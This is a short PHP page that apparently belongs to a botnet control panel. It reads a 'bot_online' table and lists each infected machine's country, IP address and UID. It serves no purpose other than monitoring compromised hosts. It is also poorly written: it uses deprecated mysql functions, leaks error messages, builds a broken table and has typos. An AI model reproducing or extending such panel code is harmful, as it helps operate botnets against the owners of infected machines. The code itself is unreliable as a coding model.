<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="stylesheet" href="css/screen.css" type="text/css" media="screen">
  <link rel="stylesheet" href="css/buttons.css" type="text/css" media="screen">
</head><?php
include("config.php");
include ("auth.php");

if (! $connect) die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT `contry` , `ip` , `uid` FROM  `bot_online`" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);
print "<center>There are $num_rows <b>Bots's</b> found.<br>";

//print "[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<h1>Bots</h1>";
while ($get_info = mysql_fetch_row($result)){
echo "<table border='1'>
<tr>
<th>Contry</th>
<th>IP</th>
<th>UID</th>
</tr>";
echo "<tr>";
foreach ($get_info as $field)
print "<td> $field //</td>";
echo "</tr>";

}
echo "</table>";
mysql_close($connect);


////('a.php');
?>